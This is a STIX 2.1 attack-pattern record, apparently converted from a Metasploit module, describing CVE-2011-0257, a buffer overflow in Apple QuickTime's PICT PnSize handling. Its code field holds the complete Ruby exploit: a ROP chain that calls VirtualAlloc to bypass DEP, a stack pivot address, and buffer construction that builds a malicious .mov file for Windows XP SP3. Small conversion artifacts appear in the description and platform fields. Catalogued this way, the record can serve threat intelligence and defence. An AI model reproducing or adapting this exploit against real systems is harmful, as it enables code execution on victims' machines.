{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--57bc132a-6f16-4dfc-99fa-eac3fc05e683",
    "created": "2024-08-14T16:35:40.329655Z",
    "modified": "2024-08-14T16:35:40.329659Z",
    "name": "Apple QuickTime PICT PnSize Buffer Overflow",
    "description": " This module exploits a vulnerability in Apple QuickTime Player 7.60.92.0. When opening a .mov file containing a specially crafted PnSize value, an attacker may be able to execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/apple_quicktime_pnsize.rb",
            "external_id": "apple_quicktime_pnsize.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-0257"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apple QuickTime PICT PnSize Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a vulnerability in Apple QuickTime Player 7.60.92.0.\n        When opening a .mov file containing a specially crafted PnSize value, an attacker\n        may be able to execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'MC',           # Original Metasploit Module\n          'corelanc0d3r <peter.ve[at]corelan.be>', # Added DEP Bypass support\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2011-0257' ],\n          [ 'OSVDB', '74687' ],\n          [ 'EDB', '17777' ],\n          [ 'BID', '49144' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => true\n        },\n      'Payload'        =>\n        {\n          'Space'          => 750,\n          'BadChars'       => \"\",  #Memcpy\n          'EncoderType'    => Msf::Encoder::Type::AlphanumUpper,\n          'DisableNops'    =>  'True',\n          'PrependEncoder' => \"\\xeb\\x03\\x59\\xeb\\x05\\xe8\\xf8\\xff\\xff\\xff\",\n          'EncoderOptions' =>\n            {\n              'BufferRegister' => 'ECX',\n            },\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          # QuickTime.qts 7.60.92.0 # ADD ESP,4D0 # RETN\n          [ 'Windows XP SP3 with DEP bypass', { 'Ret' => 0x67202c75 } ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-08-08',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME',   [ false, 'The file name.',  'msf.mov' ]),\n      ])\n  end\n\n  def exploit\n    # !mona rop\n    rop =\n    [\n      0x67e21084,  # POP ECX # RETN [QuickTimeMPEG4.qtx]\n      0x67ed30c0,  # ptr to &VirtualAlloc() [IAT QuickTimeMPEG4Authoring.qtx]\n      0x68994002,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [QTOLibrary.dll]\n      0x6696ca36,  # XCHG EAX,ESI # RETN [QuickTime.qts]\n      0x66c78001,  # POP EBP # RETN [QuickTime.qts]\n      0x67eb8573,  # & call esp [QuickTimeMPEG4Authoring.qtx]\n      0x67208003,  # POP EBX # RETN [QuickTime.qts]\n      0x00000001,  # 0x00000001-> ebx\n      0x6783ee02,  # POP EDX # RETN [QuickTimeInternetExtras.qtx]\n      0x00001000,  # 0x00001000-> edx\n      0x67e21084,  # POP ECX # RETN [QuickTimeMPEG4.qtx]\n      0x00000040,  # 0x00000040-> ecx\n      0x6762a008,  # POP EDI # RETN [QuickTimeVR.qtx]\n      0x66a78005,  # RETN (ROP NOP) [QuickTime.qts]\n      0x685a9802,  # POP EAX # RETN [QuickTimeAudioSupport.qtx]\n      0x90909090,  # nop\n      0x682f0001,  # PUSHAD # RETN [QuickTimeH264.qtx]\n    ].pack('V*')\n\n    stackpivot = [target.ret].pack('L')\n\n    buffer = rand_text_alpha_upper(2)\n    buffer << rop\n    buffer << payload.encoded\n\n    junk = rand_text_alpha_upper(2306 - buffer.length)\n\n    buffer << junk\n    buffer << stackpivot\n    buffer << rand_text_alpha_upper(3000)\n\n    path = File.join( Msf::Config.data_directory, \"exploits\", \"CVE-2011-0257.mov\" )\n    fd = File.open(path, \"rb\" )\n    sploit = fd.read(fd.stat.size)\n    fd.close\n\n    sploit << buffer\n\n    file_create(sploit)\n  end\nend\n__END__\nhttp://mirrors.apple2.org.za/apple.cabi.net/Graphics/PICT.and_QT.INFO/PICT.file.format.TI.txt\n\nOpcode   Name                       Description                  Data Size (in bytes)\n\n$0007    PnSize                     pen size (point)             4\n",
    "x_mitre_disclosure_date": "2011-08-08",
    "x_mitre_platforms": [
        "win'"
    ]
}